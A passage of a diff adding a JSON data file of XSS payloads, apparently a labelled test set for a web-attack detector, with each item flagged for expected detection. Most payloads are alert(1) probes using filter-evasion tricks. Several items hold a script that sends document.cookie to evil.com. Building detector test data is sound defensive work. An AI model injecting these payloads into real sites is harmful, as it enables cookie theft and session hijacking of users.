+    "source_ip": "21.130.126.109",
+    "timestamp": "2026-03-13T21:15:52.762505"
+  },
+  {
+    "id": "xss_0120",
+    "type": "xss",
+    "payload": "\"><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "31.245.121.242",
+    "timestamp": "2026-03-13T20:45:02.762511"
+  },
+  {
+    "id": "xss_0121",
+    "type": "xss",
+    "payload": "<marquee onstart=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "103.164.203.36",
+    "timestamp": "2026-03-13T21:12:28.762518"
+  },
+  {
+    "id": "xss_0122",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "134.77.87.253",
+    "timestamp": "2026-03-13T20:57:15.762524"
+  },
+  {
+    "id": "xss_0123",
+    "type": "xss",
+    "payload": "<audio src=x onerror=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "214.97.145.80",
+    "timestamp": "2026-03-13T20:41:13.762530"
+  },
+  {
+    "id": "xss_0124",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "49.1.0.31",
+    "timestamp": "2026-03-13T20:55:00.762542"
+  },
+  {
+    "id": "xss_0125",
+    "type": "xss",
+    "payload": "<audio src=x onerror=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "42.68.75.60",
+    "timestamp": "2026-03-13T21:24:00.762548"
+  },
+  {
+    "id": "xss_0126",
+    "type": "xss",
+    "payload": "<svg onload=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "85.245.56.217",
+    "timestamp": "2026-03-13T20:38:54.762554"
+  },
+  {
+    "id": "xss_0127",
+    "type": "xss",
+    "payload": "\"><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "120.34.189.106",
+    "timestamp": "2026-03-13T20:33:02.762561"
+  },
+  {
+    "id": "xss_0128",
+    "type": "xss",
+    "payload": "<video><source onerror='alert(1)'>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "177.246.140.247",
+    "timestamp": "2026-03-13T20:27:41.762569"
+  },
+  {
+    "id": "xss_0129",
+    "type": "xss",
+    "payload": "<div onmouseover='alert(1)'>move here</div>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "120.123.202.212",
+    "timestamp": "2026-03-13T20:50:34.762575"
+  },
+  {
+    "id": "xss_0130",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "179.144.3.91",
+    "timestamp": "2026-03-13T20:39:53.762582"
+  },
+  {
+    "id": "xss_0131",
+    "type": "xss",
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "93.189.39.19",
+    "timestamp": "2026-03-13T21:00:05.762588"
+  },
+  {
+    "id": "xss_0132",
+    "type": "xss",
+    "payload": "'><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "27.235.89.102",
+    "timestamp": "2026-03-13T21:17:41.762594"
+  },
+  {
+    "id": "xss_0133",
+    "type": "xss",
+    "payload": "<script>alert(document.cookie)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "51.223.101.190",
+    "timestamp": "2026-03-13T21:03:56.762600"
+  },
+  {
+    "id": "xss_0134",
+    "type": "xss",
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "200.40.41.249",
+    "timestamp": "2026-03-13T20:31:05.762606"
+  },
+  {
+    "id": "xss_0135",
+    "type": "xss",
+    "payload": "<marquee onstart=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "206.238.42.125",
+    "timestamp": "2026-03-13T20:59:12.762612"
+  },
+  {
+    "id": "xss_0136",
+    "type": "xss",
+    "payload": "<ScRiPt>alert(1)</sCrIpT>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "216.167.246.72",
+    "timestamp": "2026-03-13T20:49:18.762618"
+  },
+  {
+    "id": "xss_0137",
+    "type": "xss",
+    "payload": "<video><source onerror='alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "77.133.140.126",
+    "timestamp": "2026-03-13T20:37:28.762624"
+  },
+  {
+    "id": "xss_0138",
+    "type": "xss",
+    "payload": "\"><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "40.205.106.30",
+    "timestamp": "2026-03-13T20:37:46.762631"
+  },
+  {
+    "id": "xss_0139",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "18.242.26.187",
+    "timestamp": "2026-03-13T20:46:04.762637"
+  },
+  {
+    "id": "xss_0140",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "132.61.55.77",
+    "timestamp": "2026-03-13T20:28:37.762656"
+  },
+  {
+    "id": "xss_0141",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "192.215.65.47",
+    "timestamp": "2026-03-13T20:48:30.762667"
+  },
+  {
+    "id": "xss_0142",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "117.245.67.3",
+    "timestamp": "2026-03-13T21:16:52.762677"
+  },
+  {
+    "id": "xss_0143",
+    "type": "xss",
+    "payload": "<a href='javascript:alert(1)'>click</a>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "11.208.207.248",
+    "timestamp": "2026-03-13T20:51:07.762687"
+  },
+  {
+    "id": "xss_0144",
+    "type": "xss",
+    "payload": "<img src=x onerror=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "135.76.180.5",
+    "timestamp": "2026-03-13T20:24:54.762698"
+  },
+  {
+    "id": "xss_0145",
+    "type": "xss",
+    "payload": "<marquee onstart=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "4.168.60.50",
+    "timestamp": "2026-03-13T21:13:12.762709"
+  },
+  {
+    "id": "xss_0146",
+    "type": "xss",
+    "payload": "<div onmouseover='alert(1)'>move here</div>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "182.248.72.244",
+    "timestamp": "2026-03-13T20:45:12.762723"
+  },
+  {
+    "id": "xss_0147",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "106.51.138.113",
+    "timestamp": "2026-03-13T21:15:24.762732"
+  },
+  {
+    "id": "xss_0148",
+    "type": "xss",
+    "payload": "<script/xss>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "164.200.126.134",
+    "timestamp": "2026-03-13T21:00:43.762741"
+  },
+  {
+    "id": "xss_0149",
+    "type": "xss",
+    "payload": "<svg onload=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "27.251.230.3",
+    "timestamp": "2026-03-13T20:50:27.762748"
+  },
+  {
+    "id": "xss_0150",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "120.95.130.246",
+    "timestamp": "2026-03-13T20:51:46.762755"
+  },
+  {
+    "id": "xss_0151",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "79.199.169.69",
+    "timestamp": "2026-03-13T20:55:33.762761"
+  },
+  {
+    "id": "xss_0152",
+    "type": "xss",
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "20.172.31.243",
+    "timestamp": "2026-03-13T21:08:26.762767"
+  },
+  {
+    "id": "xss_0153",
+    "type": "xss",
+    "payload": "</script><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "103.119.67.147",
+    "timestamp": "2026-03-13T20:43:33.762773"
+  },
+  {
+    "id": "xss_0154",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "37.19.57.9",
+    "timestamp": "2026-03-13T21:14:08.762779"
+  },
+  {
+    "id": "xss_0155",
+    "type": "xss",
+    "payload": "\"><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "123.106.228.188",
+    "timestamp": "2026-03-13T21:13:23.762786"
+  },
+  {
+    "id": "xss_0156",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "80.163.237.59",
+    "timestamp": "2026-03-13T20:27:28.762792"
+  },
+  {
+    "id": "xss_0157",
+    "type": "xss",
+    "payload": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "182.20.234.235",
+    "timestamp": "2026-03-13T20:56:10.762798"
+  },
+  {
+    "id": "xss_0158",
+    "type": "xss",
+    "payload": "<ScRiPt>alert(1)</sCrIpT>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "62.71.133.93",
+    "timestamp": "2026-03-13T20:59:51.762804"
+  },
+  {
+    "id": "xss_0159",
+    "type": "xss",
+    "payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "202.118.156.28",
+    "timestamp": "2026-03-13T20:25:34.762810"
+  },
+  {
+    "id": "xss_0160",
+    "type": "xss",
+    "payload": "<script/xss>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "185.209.152.123",
+    "timestamp": "2026-03-13T21:20:54.762816"
+  },
+  {
+    "id": "xss_0161",
+    "type": "xss",
+    "payload": "'><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "74.23.178.224",
+    "timestamp": "2026-03-13T21:13:53.762822"
+  },
+  {
+    "id": "xss_0162",
+    "type": "xss",
+    "payload": "<script>alert(1)//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "210.216.98.42",
+    "timestamp": "2026-03-13T20:32:48.762828"
+  },
+  {
+    "id": "xss_0163",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "89.189.173.114",
+    "timestamp": "2026-03-13T20:33:08.762834"
+  },
+  {
+    "id": "xss_0164",
+    "type": "xss",
+    "payload": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "91.254.155.203",
+    "timestamp": "2026-03-13T20:51:20.762840"
+  },
+  {
+    "id": "xss_0165",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "41.99.160.12",
+    "timestamp": "2026-03-13T21:23:49.762846"
+  },
+  {
+    "id": "xss_0166",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "209.94.38.246",
+    "timestamp": "2026-03-13T20:35:15.762853"
+  },
+  {
+    "id": "xss_0167",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "186.21.158.79",
+    "timestamp": "2026-03-13T21:23:58.762872"
+  },
+  {
+    "id": "xss_0168",
+    "type": "xss",
+    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "209.65.96.1",
+    "timestamp": "2026-03-13T21:11:01.762879"
+  },
+  {
+    "id": "xss_0169",
+    "type": "xss",
+    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "134.107.5.245",
+    "timestamp": "2026-03-13T20:59:06.762885"
+  },
+  {
+    "id": "xss_0170",
+    "type": "xss",
+    "payload": "<marquee onstart=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "191.209.157.240",
+    "timestamp": "2026-03-13T21:08:44.762892"
+  },
+  {
+    "id": "xss_0171",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "81.231.37.177",
+    "timestamp": "2026-03-13T21:12:12.762898"
+  },
+  {
+    "id": "xss_0172",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "115.19.41.136",
+    "timestamp": "2026-03-13T20:25:38.762904"
+  },
+  {
+    "id": "xss_0173",
+    "type": "xss",
+    "payload": "<svg onload=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "95.247.7.166",
+    "timestamp": "2026-03-13T20:57:59.762911"
+  },
+  {
+    "id": "xss_0174",
+    "type": "xss",
+    "payload": "<script>alert(1)//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "68.118.250.168",
+    "timestamp": "2026-03-13T20:47:42.762917"
+  },
+  {
+    "id": "xss_0175",
+    "type": "xss",
+    "payload": "<audio src=x onerror=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "105.137.155.29",
+    "timestamp": "2026-03-13T20:52:20.762923"
+  },
+  {
+    "id": "xss_0176",
+    "type": "xss",
+    "payload": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "2.85.167.134",
+    "timestamp": "2026-03-13T21:05:28.762930"
+  },
+  {
+    "id": "xss_0177",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "137.175.203.40",
+    "timestamp": "2026-03-13T20:53:45.762936"
+  },
+  {
+    "id": "xss_0178",
+    "type": "xss",
+    "payload": "<script>alert(document.cookie)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "54.84.19.124",
+    "timestamp": "2026-03-13T20:55:08.762942"
+  },
+  {
+    "id": "xss_0179",
+    "type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "192.85.85.146",
+    "timestamp": "2026-03-13T20:44:23.762948"
+  },
+  {
+    "id": "xss_0180",
+    "type": "xss",
+    "payload": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "107.129.228.114",
+    "timestamp": "2026-03-13T20:41:01.762954"
+  },
+  {
+    "id": "xss_0181",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "44.54.149.105",
+    "timestamp": "2026-03-13T20:53:52.762960"
+  },
+  {
+    "id": "xss_0182",
+    "type": "xss",
+    "payload": "<a href='javascript:alert(1)'>click</a>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "149.74.60.231",
+    "timestamp": "2026-03-13T21:07:03.762966"
+  },
+  {
+    "id": "xss_0183",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "192.211.136.148",
+    "timestamp": "2026-03-13T20:34:08.762972"
+  },
+  {
+    "id": "xss_0184",
+    "type": "xss",
+    "payload": "<div onmouseover='alert(1)'>move here</div>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "198.87.206.207",
+    "timestamp": "2026-03-13T20:50:46.762979"
+  },
+  {
+    "id": "xss_0185",
+    "type": "xss",
+    "payload": "'><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "206.124.117.14",
+    "timestamp": "2026-03-13T20:33:22.762985"
+  },
+  {
+    "id": "xss_0186",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "32.0.65.89",
+    "timestamp": "2026-03-13T21:07:15.762991"
+  },
+  {
+    "id": "xss_0187",
+    "type": "xss",
+    "payload": "<script>alert(document.cookie)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "150.153.171.208",
+    "timestamp": "2026-03-13T21:05:39.762999"
+  },
+  {
+    "id": "xss_0188",
+    "type": "xss",
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "39.233.164.152",
+    "timestamp": "2026-03-13T21:17:39.763008"
+  },
+  {
+    "id": "xss_0189",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "110.152.196.57",
+    "timestamp": "2026-03-13T21:14:55.763014"
+  },
+  {
+    "id": "xss_0190",
+    "type": "xss",
+    "payload": "<img src=x onerror=alert(1)>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "57.123.168.212",
+    "timestamp": "2026-03-13T21:02:59.763020"
+  },
+  {
+    "id": "xss_0191",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "152.194.209.94",
+    "timestamp": "2026-03-13T21:08:52.763027"
+  },
+  {
+    "id": "xss_0192",
+    "type": "xss",
+    "payload": "<body onload=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "125.30.188.207",
+    "timestamp": "2026-03-13T21:02:32.763033"
+  },
+  {
+    "id": "xss_0193",
+    "type": "xss",
+    "payload": "<!--><script>alert(1)</script>",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "57.51.158.53",
+    "timestamp": "2026-03-13T20:35:06.763039"
+  },
+  {
+    "id": "xss_0194",
+    "type": "xss",
+    "payload": "<img src=x onerror=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "8.176.19.53",
+    "timestamp": "2026-03-13T20:37:36.763045"
+  },
+  {
+    "id": "xss_0195",
+    "type": "xss",
+    "payload": "<IMG SRC=x OnErRoR=alert(1)>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "130.19.237.90",
+    "timestamp": "2026-03-13T21:11:08.763052"
+  },
+  {
+    "id": "xss_0196",
+    "type": "xss",
+    "payload": "\"><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "69.124.126.31",
+    "timestamp": "2026-03-13T20:52:28.763058"
+  },
+  {
+    "id": "xss_0197",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "114.10.100.170",
+    "timestamp": "2026-03-13T21:13:35.763066"
+  },
+  {
+    "id": "xss_0198",
+    "type": "xss",
+    "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "severity": "medium",
+    "expected_detection": true,
+    "source_ip": "8.222.248.242",
+    "timestamp": "2026-03-13T20:36:36.763073"
+  },
+  {
+    "id": "xss_0199",
+    "type": "xss",
+    "payload": "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "215.194.217.202",
+    "timestamp": "2026-03-13T21:17:07.763079"
+  }
+]
